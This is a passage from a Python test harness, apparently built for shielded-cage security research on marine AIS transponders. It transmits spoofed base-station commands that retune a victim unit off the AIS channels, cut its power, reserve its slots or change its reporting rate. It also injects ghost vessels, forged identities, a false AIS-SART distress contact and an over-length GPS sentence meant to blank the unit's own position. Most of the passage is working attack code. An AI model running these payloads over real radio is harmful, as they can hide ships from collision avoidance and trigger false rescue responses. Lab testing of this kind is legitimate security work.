    b += enc._bits(tx_rx, 2) + enc._bits(interval, 4) + enc._bits(quiet, 4) + enc._bits(0, 6)
    return (b + "0" * 160)[:160]


# Channel-management + slot-reservation retry, using spec-valid base-station messages so M22/M20
# are actually testable (the earlier addressed M22 never met the 61993-2 17.7 acceptance rule).
ALT_CH_A, ALT_CH_B = 2084, 2085          # regional channels off the default AIS1/AIS2 pair
DEF_CH_A, DEF_CH_B = 2087, 2088          # AIS1/AIS2

def build_chanmgmt(ctx):
    """Base-station command suite, re-runnable on its own (--chanmgmt-only). ORDERING RATIONALE:
    a successful M22 channel switch REMOVES the victim from the witness's channels (AIS1/AIS2),
    after which nothing else can be observed there -- the furuno_extra_base capture showed exactly
    this (the unit's later M20 cells were unobservable once it had been retuned). So every test
    that is observable while the unit is still on the default channels (rate, slots, group
    assignment, power, single-channel Tx/Rx) runs FIRST, and the channel switch runs LAST. Each
    management cell re-announces the base (Msg 4) so a unit that checks station class always sees a
    live base. All injection goes out the simulator's single fixed channel, so a restore sent on
    the default channel will NOT reach a unit that has already moved -- that is the demonstrated
    recovery trap, handled by the operator note in the runner, not an encoding bug."""
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
          "Msg4 base-station announcement")
    cm = []
    cm.append(("cm_announce_base", [m4]))

    # ================= ON-CHANNEL TESTS (victim still on AIS1/AIS2, so observable) =============
    # 1) M16 reporting-rate assignment: base then ship (authority), then release. Retest for
    #    Furuno WITH a base announced -- the earlier M16 no-effect may have been the missing base.
    cm.append(("cm_m16_base_fastrate",
        [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
              "M16 (base) force MAX reporting rate 600/10min")]))
    cm.append(("cm_m16_ship_fastrate",
        [m4, (enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
              "M16 (ordinary ship) force MAX rate -- authority test")]))
    cm.append(("cm_m16_base_release",
        [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
              "M16 (base) release to slow rate (autonomous wins)")]))

    # 2) M20 FATDMA slot reservation over the victim's typical slots: base then ship. With the
    #    victim still on AIS1/AIS2 the analyzer can check whether it vacates the reserved slots.
    #    Default targets bracket a slow Class A's observed slot set (~60,420,810,1170,1525,1870).
    def m20_blocks(src):
        return [m4] + [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
                        f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
    cm.append(("cm_m20_base", m20_blocks(BASE_MMSI)))
    cm.append(("cm_m20_ship", m20_blocks(REGULAR_MMSI)))

    # 3) M23 group assignment (region + all station/ship types): slow the reporting interval,
    #    base then ship, then clear. Reversible and observable as a rate change on the witness.
    #    (The helper also supports quiet=1..15 for region-wide silence; not used here because a
    #    quiet time would confound the later on-channel cells. Run it alone if you want it.)
    cm.append(("cm_m23_base_slow",
        [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=11, quiet=0),
              "M23 (base) group assignment: slow reporting interval over the region")]))
    cm.append(("cm_m23_ship_slow",
        [m4, (_m23_group(REGULAR_MMSI, vlat, vlon, interval=11, quiet=0),
              "M23 (ordinary ship) group slow -- authority test")]))
    cm.append(("cm_m23_base_clear",
        [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=0, quiet=0),
              "M23 (base) clear group assignment")]))

    # 4) M22 power: command LOW power on the same (default) channels; the victim stays on
    #    AIS1/AIS2 so a drop in received signal level on the witness is the observable effect.
    cm.append(("cm_m22_base_powerlow",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=1),
              "M22 (base) set LOW power on default channels")]))
    cm.append(("cm_m22_base_powerrestore",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0),
              "M22 (base) restore HIGH power")]))

    # 5) M22 Tx/Rx mode = Tx on channel A only: the victim should stop transmitting on B while
    #    still on A -- a partial, observable disappearance -- then restore both channels.
    cm.append(("cm_m22_base_txrxA",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, tx_rx=1),
              "M22 (base) Tx on channel A only (mode 1)")]))
    cm.append(("cm_m22_base_txrxrestore",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, tx_rx=0),
              "M22 (base) restore Tx on both channels")]))

    # ================= OFF-CHANNEL TEST LAST (removes the victim from AIS1/AIS2) ================
    # 6) Channel switch to the alternate regional pair. SHIP first while the victim is still on the
    #    default channels (expect NO effect -> victim stays visible = ship authority rejected),
    #    then BASE (expect the victim to leave AIS1/AIS2 = accepted). This is the proven positive;
    #    nothing after it is observable on the witness, so it is intentionally last. The restore is
    #    sent on the default channel and will NOT reach a unit that has moved (recovery trap).
    cm.append(("cm_m22_ship_altchan",
        [m4, (_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
              f"M22 (ordinary ship) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect IGNORED")]))
    cm.append(("cm_m22_base_altchan",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
              f"M22 (base) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect victim leaves AIS1/AIS2")]))
    cm.append(("cm_m22_base_restore",
        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
              f"M22 (base) restore default {DEF_CH_A}/{DEF_CH_B} (may not reach a moved unit)")]))
    return cm

M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots


# Frequency sweep targets: which channel numbers does a unit accept? 2087/2088 are the default
# AIS pair and 2084/2085 are near-band AIS alternates; the interesting cases are the ones OUTSIDE
# the AIS band (a unit that retunes there would emit AIS on a channel used for other VHF services)
# and the invalid/edge values (a well-formed unit should clamp/reject). Controls first, then
# adjacent, then out-of-band, then invalid.
SWEEP_TARGETS = [
    (2088, "AIS2 162.025 -- control: legal target (no-op, stays visible)"),
    (2087, "AIS1 161.975 -- control: legal target (no-op, stays visible)"),
    (2086, "ch 86 ~161.925 -- adjacent, just below the AIS pair"),
    (2078, "ch 78 -- near-band marine"),
    (2028, "ch 28 -- upper marine band"),
    (2001, "ch 1 ~156.05 -- OUT OF AIS BAND (port/voice)"),
    (0,    "channel 0 -- invalid/edge (should be rejected)"),
    (4095, "channel 4095 -- max 12-bit, invalid (should be rejected)"),
]


def build_chanmgmt_sweep(ctx):
    """Frequency sweep: try to move the victim to each SWEEP_TARGETS channel via a broadcast
    regional Msg 22 from a base, to find WHICH channels the unit accepts -- especially any OUTSIDE
    the AIS band, where acceptance means the unit emits AIS on a channel used for other VHF
    services. After each target a restore-to-default is sent, but that restore is only HEARD if the
    unit REJECTED the target and stayed on the default channel. If a unit ACCEPTS a target it moves
    and goes dark on the witness, and neither the next target nor its restore reaches it -- so a
    genuine acceptance ends the useful sweep and needs manual recovery (front panel, or
    --chanmgmt-recover with the simulator retuned to the accepted channel). Run this as its OWN
    pass (--chanmgmt-sweep); it is destructive on a permissive unit, so it is not interleaved with
    the observable on-channel tests in build_chanmgmt."""
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
          "Msg4 base-station announcement")
    cells = []
    for chan, label in SWEEP_TARGETS:
        cells.append((f"sweep_ch{chan}",
            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, chan, chan),
                  f"M22 (base) regional retune to channel {chan} [{label}]")]))
        cells.append((f"sweep_recover_ch{chan}",
            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0),
                  "restore default (heard ONLY if the target was rejected)")]))
    return cells


def build_chanmgmt_recover(ctx):
    """Operator-driven recovery payloads: announce the base and restore the DEFAULT AIS channels
    (high power, both-channel Tx/Rx) and clear any rate/group assignment. To reach a unit that has
    already moved off-channel, run this (--chanmgmt-recover) with the ais-simulator retuned to the
    channel the unit is STUCK on, so the command is transmitted where the unit is now listening."""
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    return [
        enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
        _m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0, tx_rx=0),
        _m23_group(BASE_MMSI, vlat, vlon, interval=0, quiet=0),
        enc.encode_type16(BASE_MMSI, ctx.victim_mmsi, offset_a=20, increment_a=0),
    ]


def build_photo(ctx):
    """Photogenic attacks, each sustained for a couple of minutes so the display can be
    photographed. RF steps drive the transponder over the air (target contacts); the one serial
    step drives its GPS input to suppress own position. Each step prints a banner and holds."""
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    gp = offset_position(vlat, vlon, 45, 4000)     # ghost ~4 km NE of the victim
    sp = offset_position(vlat, vlon, 90, 3000)
    steps = []
    # 1) impossible speed while not moving: fixed position, SOG 102.2 kn (max real value), named.
    steps.append(("photo_impossible_speed", "rf",
        [(enc.encode_type1(GHOST_A, gp[0], gp[1], sog=102.2, cog=90.0, nav_status=0),
          "Type1 ghost, 102.2 kn, position held fixed"),
         (enc.encode_type24_a(GHOST_A, shipname="GHOST VESSEL"),
          "Type24 name for the ghost")],
        "IMPOSSIBLE SPEED: a ghost reporting 102.2 kn while its position never changes"))
    # 2) forged identity: fabricated name + call sign on a target.
    steps.append(("photo_forged_identity", "rf",
        [(enc.encode_type24_a(GHOST_A, shipname="NOT REAL NAME"), "Type24A forged name"),
         (enc.encode_type24_b(GHOST_A, callsign="FAKE1", shiptype=70), "Type24B forged call sign"),
         (enc.encode_type1(GHOST_A, gp[0], gp[1], sog=6.0, cog=270.0), "Type1 position for the identity")],
        "FORGED IDENTITY: a contact with a fabricated name and call sign"))
    # 3) false distress: 970-prefix (AIS-SART) contact with distress status.
    steps.append(("photo_sart_distress", "rf",
        [(enc.encode_type1(SAR_PREFIX, sp[0], sp[1], sog=0.0, nav_status=14),
          "Type1 AIS-SART (970 prefix), distress status")],
        "FALSE DISTRESS: an AIS-SART / locating-device contact where no emergency exists"))
    # 4) traffic denial (serial): own position suppressed by an over-length sentence.
    steps.append(("photo_dos_noposition", "serial",
        ("$GPRMC,120000.00,A,4330.0000,N,07130.0000,W,0.0,90.0,180626,,,A," + "9" * 8000 + "\r\n").encode(),
        "TRAFFIC DENIAL: own position suppressed by an over-length serial sentence"))
    return steps


def build_serial_extras(ctx):
    """Serial-input probes injected on the GPS line; detection is offline from the unit's output
    capture. These exercise the IEC 61162-1 sentence-layer parser. Multi-sentence reassembly on a
    sensor-input port is best-effort and may not apply to every unit -- serial_parser_suite.py is
    the primary home for deep serial parser tests. Returns (name, [(raw, pre_delay_s), ...], meta)."""
    def ck(body):
        c = 0
        for ch in body:
            c ^= ord(ch)
        return f"{c:02X}"
    def sent(body, good=True):
        return f"${body}*{ck(body) if good else '00'}\r\n"

    p1 = "!AIVDM,2,1,3,A,55P5TL01VIaAL@7WKO@mBplU@<PDhh000000001S;AJ::4A80?4i@E5,0"
    p2 = "1Ph:A>Q@0"
    sx = []
    # INV-A-RECV-08: reassembly -- part 2 has a BAD checksum -> whole message discarded (IEC 7.3.9).
    sx.append(("sx_multipart_frag_error",
        [(sent(p1, True), 0.0), (sent(p2, False), 0.2)],
        "2-part sentence, part 2 bad checksum -> whole message must be discarded"))
    # INV-A-RECV-08: reassembly timeout -- >5 s gap between fragments (IEC 7.3.12).
    sx.append(("sx_multipart_timeout",
        [(sent(p1, True), 0.0), (sent(p2, True), 6.0)],
        "2-part sentence with a >5s gap between fragments -> reassembly should time out"))
    # INV-A-SEM-01: config semantics. Exact formatter is vendor-specific; adapt per unit.
    sx.append(("sx_config_no_c_flag",
        [("$PAISCFG,RATE,5,R\r\n", 0.0)],
        "config-style sentence WITHOUT the 'C' command flag -> must not change config"))
    sx.append(("sx_config_null_field",
        [("$PAISCFG,RATE,,C\r\n", 0.0)],
        "config command with a NULL command field -> must be treated as no change"))
    return sx


def main():
    ap = argparse.ArgumentParser(description="Run a full GPS+attack session (synced).")
    ap.add_argument("--gps-port", required=True, help="serial port feeding the victim GPS")
    ap.add_argument("--gps-baud", type=int, default=4800)
    ap.add_argument("--victim-mmsi", type=int, required=True,
                    help="the transponder's MMSI (addressed commands target this)")
    ap.add_argument("--lat", type=float, required=True, help="victim start latitude")
    ap.add_argument("--lon", type=float, required=True, help="victim start longitude")
    ap.add_argument("--url", default="ws://127.0.0.1:52002/ws")
    ap.add_argument("--gap", type=float, default=15.0,
                    help="seconds between phase-1 attacks")
    ap.add_argument("--phase2-gap", type=float, default=30.0,
                    help="seconds between phase-2 (aggressive) attacks; kept large")
    ap.add_argument("--phase2", action="store_true",
                    help="also run the aggressive phase-2 tests (base-station power, "
                         "channel swap, off-band retune, illegal rate, slot/TDMA overload)")
    ap.add_argument("--phase2-only", action="store_true",
                    help="skip phase 1 and run ONLY the aggressive phase-2 tests")
    ap.add_argument("--phase3", action="store_true",
                    help="also run the phase-3 source-authority matrix: each management "
                         "command (M15/M16/M20/M22/M6) fired from BOTH a valid base-station "
                         "MMSI and a regular ship MMSI, to test whether the unit checks source")
    ap.add_argument("--phase3-only", action="store_true",
                    help="skip phases 1 and 2 and run ONLY the source-authority matrix")
    ap.add_argument("--m20", action="store_true",
                    help="also run the focused M20 slot-reservation density suite")
    ap.add_argument("--m20-only", action="store_true",
                    help="run ONLY the M20 slot-reservation suite (skip phases 1-3) so it can be "
                         "re-run on its own without repeating the whole session")
    ap.add_argument("--m20-gap", type=float, default=35.0,
                    help="dwell after each M20 cell (>= a few victim report cycles so the slot "
                         "map re-settles and the reaction is visible)")
    ap.add_argument("--phase3-gap", type=float, default=90.0,
                    help="seconds of dwell after each phase-3 command (kept long so slow "
                         "effects like rate changes or retunes have time to appear)")
    ap.add_argument("--fast-speed", type=float, default=25.0,
                    help="knots to set the victim during the illegal-rate test "
                         "(>23kn requires 2s reporting; assigning slow is then illegal)")
    ap.add_argument("--settle", type=float, default=60.0,
                    help="seconds to feed GPS before starting attacks (let it get a fix)")
    ap.add_argument("--repeat", type=int, default=3,
                    help="legacy burst count when --accept-dwell is 0 (persistence)")
    ap.add_argument("--accept-dwell", type=float, default=8.0,
                    help="phase-1 persistence: seconds to keep re-sending each attack at the AIS "
                         "cadence so a false target / own-MMSI echo registers as a real contact "
                         "instead of a dropped transient. Set 0 to use the old repeatx0.8 burst.")
    ap.add_argument("--accept-cadence", type=float, default=2.0,
                    help="seconds between re-sends within --accept-dwell (2s = the fast AIS rate)")
    ap.add_argument("--extras", action="store_true",
                    help="also run the new A/B invariant probes (fake base/DGNSS, Type-5 identity, "
                         "replay, static mutation/part-binding, duplicate MMSI, distress-state, "
                         "M9-from-ship, M20-without-base, interrogation flood, plus serial "
                         "multi-sentence/config probes)")
    ap.add_argument("--extras-only", action="store_true",
                    help="run ONLY the extra probes (skip phases 1-3 and the M20 suite)")
    ap.add_argument("--skip-serial-extras", action="store_true",
                    help="with --extras, skip the serial-injected probes (run only RF extras)")
    ap.add_argument("--chanmgmt", action="store_true",
                    help="also run the base-station channel-management / slot-reservation retry "
                         "(spec-valid regional Msg 22 + Msg 20, base then ordinary ship)")
    ap.add_argument("--chanmgmt-only", action="store_true",
                    help="run ONLY the channel-management / slot-reservation retry")
    ap.add_argument("--chanmgmt-gap", type=float, default=45.0,
                    help="dwell after each channel-management command (long, so a channel "
                         "switch is unambiguous on the witness)")
    ap.add_argument("--chanmgmt-preroll", type=float, default=90.0,
                    help="no-injection baseline (victim on AIS1/AIS2) logged before the "
                         "channel-management suite so the later vanish is measured against it")
    ap.add_argument("--chanmgmt-postroll", type=float, default=90.0,
                    help="no-injection window after the suite to see whether the victim "
                         "returns to AIS1/AIS2 once the default channels are restored")
    ap.add_argument("--chanmgmt-no-switch", action="store_true",
                    help="run the channel-management suite but OMIT the channel-switch cells, so "
                         "the unit never leaves the default channels and every test self-recovers "
                         "(fills the M16/M20/M23/power/Tx-Rx rows without stranding the unit). Use "
                         "this for repeat runs; do the vanish/switch separately when ready to recover.")
    ap.add_argument("--chanmgmt-sweep", action="store_true",
                    help="run ONLY the frequency sweep: try to retune the victim to a range of "
                         "target channels (in-band controls, near-band, OUT-OF-AIS-BAND, and "
                         "invalid) to find which it accepts. Destructive on a permissive unit; "
                         "recover any accepted target with --chanmgmt-recover.")
    ap.add_argument("--chanmgmt-recover", action="store_true",
                    help="run ONLY the restore-to-default broadcast (default channels, high power, "
                         "cleared rate/group). Retune the ais-simulator to the channel the unit is "
                         "STUCK on before running this so the command reaches it.")
    ap.add_argument("--clear-region", action="store_true",
                    help="before anything else, feed a position far from the cage so the unit "
                         "deletes any stored regional operating area by the >500-mile rule (a "
                         "manually-entered region outranks a Msg 22 and would otherwise block the "
                         "channel switch). Returns the unit to the clean state, then resumes.")
    ap.add_argument("--clear-region-offset", type=float, default=10.0,
                    help="degrees of latitude to jump for --clear-region (10 deg ~ 690 miles > the "
                         "500-mile deletion threshold)")
    ap.add_argument("--clear-region-dwell", type=float, default=240.0,
                    help="seconds to hold the far position so the unit runs its regional-area "
                         "housekeeping and deletes the out-of-range area")
    ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
                                        "sart_distress", "dos_noposition"],
                    help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
                         "display can be photographed; restart with a different value for each shot")
    ap.add_argument("--only", nargs="+", help="run only these named attacks")
    ap.add_argument("--skip", nargs="+", default=[])
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    if websocket is None or serial is None:
        print("!! needs websocket-client, pyserial, pynmea2:")
        print("   pip install websocket-client pyserial pynmea2 --break-system-packages")
        sys.exit(1)

    if not args.i_confirm_cage_sealed:
        if input("Type EXACTLY 'cage is sealed' to run the session: ").strip() != "cage is sealed":
            print("Aborted."); sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    manifest = os.path.join(args.logdir, f"session_{stamp}.jsonl")
    mf = open(manifest, "a", buffering=1)
    def rec(**kw):
        mf.write(json.dumps({"t": time.time(),
                             "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                             **kw}) + "\n")

    # start GPS feed
    gps = GpsFeed(args.gps_port, args.gps_baud, args.lat, args.lon)
    gps.start()
    rec(event="session_start", victim_mmsi=args.victim_mmsi,
        start_lat=args.lat, start_lon=args.lon, gps_port=args.gps_port)
    print(f"GPS feeding victim @ {args.lat},{args.lon} on {args.gps_port}")

    # Optional: clear any stored regional operating area before attacking. A manually-entered
    # region outranks a Msg 22 broadcast, so it blocks the channel switch (observed: the attack
    # works from a clean unit but not once a manual region is set). Regional area data is deleted
    # when the unit is >500 miles from where the area was registered, and that distance rule is not
    # gated by source priority -- so we feed a far-away position, hold it while the unit runs its
    # regional housekeeping, then return to the cage position in a clean state.
    if args.clear_region:
        far_lat = args.lat + args.clear_region_offset
        miles = args.clear_region_offset * 69.0
        print(f"clear-region: feeding a position {args.clear_region_offset:.0f} deg (~{miles:.0f} mi) "
              f"north for {args.clear_region_dwell:.0f}s to delete any stored regional area...")
        gps.set_position(far_lat, args.lon)
        rec(event="clear_region_start", far_lat=far_lat, far_lon=args.lon,
            dwell=args.clear_region_dwell, note="feed >500mi so the unit deletes stored regional areas")
        time.sleep(args.clear_region_dwell)
        gps.set_position(args.lat, args.lon)
        rec(event="clear_region_end", note="returned to cage position; stored regional/manual area should be deleted")
        print("clear-region: back at the cage position; the unit should now be region-free.")

    print(f"settling {args.settle}s so the transponder gets a fix...")
    time.sleep(args.settle)

    ctx = Ctx(args.victim_mmsi, gps)
    timeline = build_timeline(ctx)
    if (args.phase2_only or args.phase3_only or args.extras_only or args.chanmgmt_only
            or args.chanmgmt_sweep or args.chanmgmt_recover or args.photo):
        timeline = []
    if args.only:
        timeline = [(n, p) for (n, p) in timeline if n in args.only]
    timeline = [(n, p) for (n, p) in timeline if n not in args.skip]

    print(f"connecting to {args.url}")
    ws = websocket.create_connection(args.url, timeout=10)
    print(f"phase 1: {len(timeline)} attacks, {args.gap}s apart, repeat {args.repeat}x\n")

    def fire(name, payloads, idx, total, tag="", extra=None):
        rec(event="attack_begin", name=name, index=idx, phase=tag,
            victim_lat=ctx.victim_lat, victim_lon=ctx.victim_lon,
            victim_speed=gps.speed, **(extra or {}))
        print(f"[{tag}{idx+1}/{total}] {name} @ {time.strftime('%H:%M:%S')}")

        def _send_once(r):
            for (bits, meta) in payloads:
                if any(c not in "01" for c in bits):
                    rec(event="skip_bad", name=name, meta=meta); continue
                ws.send(bits)
                # Record the injected message's source MMSI + type so the analyzer can
                # match each send against the listener VHF capture and self-calibrate the
                # attacker<->listener clock offset from shared events (no NTP trust needed).
                # Every AIS payload begins: type(6) | repeat(2) | source MMSI(30).
                mtype = int(bits[0:6], 2) if len(bits) >= 6 else None
                src_mmsi = int(bits[8:38], 2) if len(bits) >= 38 else None
                rec(event="sent", name=name, rep=r, meta=meta, bits_len=len(bits),
                    src_mmsi=src_mmsi, mtype=mtype)
                print(f"      -> {meta}")

        # Persistence: a single (or 3-burst) reception can be dropped as a transient, so a
        # false target / own-MMSI echo only registers reliably if it reports at the AIS cadence
        # across a dwell -- the same reason the serial acceptance probes now repeat. Spread the
        # sends over --accept-dwell at --accept-cadence; fall back to the old repeatx0.8 burst
        # only if the dwell is disabled (--accept-dwell 0).
        if args.accept_dwell > 0:
            end = time.time() + args.accept_dwell; r = 0
            while time.time() < end:
                _send_once(r); r += 1; time.sleep(args.accept_cadence)
        else:
            for r in range(args.repeat):
                _send_once(r); time.sleep(0.8)
        rec(event="attack_end", name=name)

    try:
        # ---- photo mode: play ONE attack forever so the display can be photographed ----
        if args.photo:
            steps = {n.replace("photo_", ""): (n, kind, payload, banner)
                     for (n, kind, payload, banner) in build_photo(ctx)}
            name, kind, payload, banner = steps[args.photo]
            rec(event="photo_loop_start", name=name, kind=kind)
            print("\n" + "=" * 66)
            print(f"  PLAYING (infinite loop): {name}")
            print(f"  >>> {banner}")
            print("  >>> Photograph the display now. Press Ctrl-C to stop and restart")
            print("  >>> with a different --photo value for the next shot.")
            print("=" * 66 + "\n")
            reps = 0
            while True:
                if kind == "rf":
                    for bits, meta in payload:
                        if all(c in "01" for c in bits):
                            ws.send(bits)
                    time.sleep(args.accept_cadence)
                else:
                    gps.inject_raw(payload)
                    time.sleep(0.5)
                reps += 1
                if reps % 30 == 0:
                    print(f"    ...still playing '{args.photo}' ({reps} reps), Ctrl-C to stop")

        if not (args.m20_only or args.phase2_only or args.phase3_only):
            for i, (name, payloads) in enumerate(timeline):
                fire(name, payloads, i, len(timeline), tag="P1:")
                if i < len(timeline) - 1:
                    time.sleep(args.gap)

        # ---- M20 slot-reservation density suite (focused; --m20 or --m20-only) ----
        if args.m20 or args.m20_only:
            m20 = build_m20_suite(ctx)
            # constant fast speed for the whole suite -> dense, uniform slot sampling; a fixed
            # speed keeps the reporting rate the same in control and test windows (no confound).
            gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=args.fast_speed, course=90.0)
            rec(event="victim_speed_set", speed=args.fast_speed, note="constant speed for M20 slot sampling")
            print(f"\n=== M20 SUITE: {len(m20)} cells, {args.m20_gap}s dwell each "
                  f"(victim SOG={args.fast_speed}kn for dense sampling) ===")
            time.sleep(8)
            # clean baseline-control window (no injection at all) for the traffic-matched reference
            rec(event="attack_begin", name="m20_baseline_control", index=-1, phase="M20:",
                victim_lat=ctx.victim_lat, victim_lon=ctx.victim_lon, victim_speed=gps.speed)
            print(f"    baseline control (no reservation), {args.m20_gap:.0f}s ...")
            time.sleep(args.m20_gap)
            rec(event="attack_end", name="m20_baseline_control")
            rec(event="m20_start", n=len(m20), gap=args.m20_gap,
                base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI)
            for i, (name, payloads) in enumerate(m20):
                extra = None
                if name.startswith("m20_recover_"):
                    extra = {"command": "M20", "source": "recovery"}
                else:
                    parts = name[len("m20_"):].split("_", 1)   # m20_<src>_<label>
                    extra = {"command": "M20", "source": parts[0], "density": parts[1] if len(parts) > 1 else ""}
                fire(name, payloads, i, len(m20), tag="M20:", extra=extra)
                if i < len(m20) - 1:
                    print(f"    ...{args.m20_gap:.0f}s dwell (watch slot behaviour)...")
                    time.sleep(args.m20_gap)
            gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
            rec(event="victim_speed_set", speed=0.0, note="restored after M20 suite")

        # ---- extra probes (new A/B invariant tests): --extras or --extras-only ----
        if args.extras or args.extras_only:
            ex = build_extras(ctx)
            print(f"\n=== EXTRAS: {len(ex)} new RF probes, {args.gap}s apart ===")
            rec(event="extras_start", n=len(ex))
            for i, (name, payloads) in enumerate(ex):
                fire(name, payloads, i, len(ex), tag="EX:")
                if i < len(ex) - 1:
                    time.sleep(args.gap)
            if not args.skip_serial_extras:
                sx = build_serial_extras(ctx)
                print(f"\n=== SERIAL EXTRAS: {len(sx)} probes (injected on the GPS line) ===")
                rec(event="serial_extras_start", n=len(sx))
                for i, (name, chunks, meta) in enumerate(sx):
                    rec(event="serial_extra_begin", name=name, meta=meta, index=i)
                    print(f"[SX:{i+1}/{len(sx)}] {name}")
                    for (raw, delay) in chunks:
                        if delay:
                            print(f"      ...{delay:.0f}s gap..."); time.sleep(delay)
                        gps.inject_raw(raw)
                        rec(event="serial_extra_sent", name=name, nbytes=len(raw),
                            sample=(raw[:80] if isinstance(raw, str)
                                    else raw[:80].decode('latin-1', 'replace')))
                        print(f"      -> injected {len(raw)}B")
                    rec(event="serial_extra_end", name=name)
                    if i < len(sx) - 1:
                        time.sleep(args.gap)

        # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
        if args.chanmgmt or args.chanmgmt_only:
            cm = build_chanmgmt(ctx)
            if args.chanmgmt_no_switch:
                # drop the channel-switch cells; keep everything the unit self-recovers from, so a
                # repeat run never strands it off-channel (recovery is a painful manual overwrite).
                cm = [(n, p) for (n, p) in cm if "altchan" not in n]
                print("    (--chanmgmt-no-switch: channel-switch cells omitted; unit stays on AIS1/AIS2)")
            print("\n" + "=" * 72)
            print("  RF WITNESS REQUIRED. Make sure record_ais.sh is RUNNING on channels AB")
            print("  (AIS1/AIS2, 2087/2088) and LEAVE IT RUNNING until this prints 'CHANMGMT DONE'.")
            print("  Clocks need NOT be synced: alignment is done offline from shared injected")
            print("  events, not wall time. On-channel tests run first; the channel switch is last.")
            print("=" * 72)
            rec(event="chanmgmt_start", n=len(cm), base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
                alt_ch=(ALT_CH_A, ALT_CH_B), def_ch=(DEF_CH_A, DEF_CH_B),
                witness_channels="AB (2087/2088)",
                note="on-channel tests first; channel switch last (removes victim from witness)")
            # PREROLL: a labelled no-injection baseline so the witness has a clean 'victim present
            # on AIS1/AIS2' reference; the later vanish is measured against this window.
            rec(event="chanmgmt_preroll_start", seconds=args.chanmgmt_preroll)
            print(f"    preroll: {args.chanmgmt_preroll:.0f}s baseline (victim on AIS1/AIS2, no injection)...")
            time.sleep(args.chanmgmt_preroll)
            rec(event="chanmgmt_preroll_end")
            print(f"\n=== CHANNEL MANAGEMENT: {len(cm)} steps, {args.chanmgmt_gap}s dwell each ===")
            for i, (name, payloads) in enumerate(cm):
                # tag command + source so the analyzer can build the base-vs-ship result
                src = "ship" if "ship" in name else "base"
                if   "m22" in name: cmd = "M22"
                elif "m20" in name: cmd = "M20"
                elif "m16" in name: cmd = "M16"
                elif "m23" in name: cmd = "M23"
                else:               cmd = "announce"
                fire(name, payloads, i, len(cm), tag="CM:", extra={"command": cmd, "source": src})
                if i < len(cm) - 1:
                    short = name.endswith(("restore", "release", "clear")) or name == "cm_announce_base"
                    dwell = 8 if short else args.chanmgmt_gap
                    print(f"    ...{dwell:.0f}s dwell (watch witness for the victim on AIS1/AIS2)...")
                    time.sleep(dwell)
            # final safety recovery: force the region back to the default channels several times.
            # NOTE: this goes out the simulator's single fixed channel, so if the unit already moved
            # it will NOT hear this -- that is the demonstrated recovery trap, not a bug.
            print("    final recovery: restoring default AIS channels + high power for the region")
            for _ in range(3):
                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
                                      DEF_CH_A, DEF_CH_B, power=0))
                rec(event="final_recovery", meta="restore default channels (regional M22)")
                time.sleep(1)
            # POSTROLL: labelled no-injection window to check whether the victim RETURNS to
            # AIS1/AIS2 after the restore (in the furuno run it did not -> the recovery trap).
            rec(event="chanmgmt_postroll_start", seconds=args.chanmgmt_postroll)
            print(f"    postroll: {args.chanmgmt_postroll:.0f}s, watching whether the victim returns to AIS1/AIS2...")
            time.sleep(args.chanmgmt_postroll)
            rec(event="chanmgmt_postroll_end")
            print("\n" + "!" * 72)
            print("  CHANMGMT DONE -- stop the RF and serial recorders now.")
            print("  RECOVERY: if the unit is still OFF AIS1/AIS2, a restore sent on the default")
            print("  channel cannot reach it. Clear its regional/channel settings from the MKD")
            print(f"  front panel, or retune the ais-simulator to {ALT_CH_A}/{ALT_CH_B} and run")
            print("  rf_session.py --chanmgmt-recover to send the restore on that channel.")
            print("!" * 72)

        # ---- frequency sweep (--chanmgmt-sweep): which channels does the unit accept? ----
        if args.chanmgmt_sweep:
            sw = build_chanmgmt_sweep(ctx)
            print("\n" + "=" * 72)
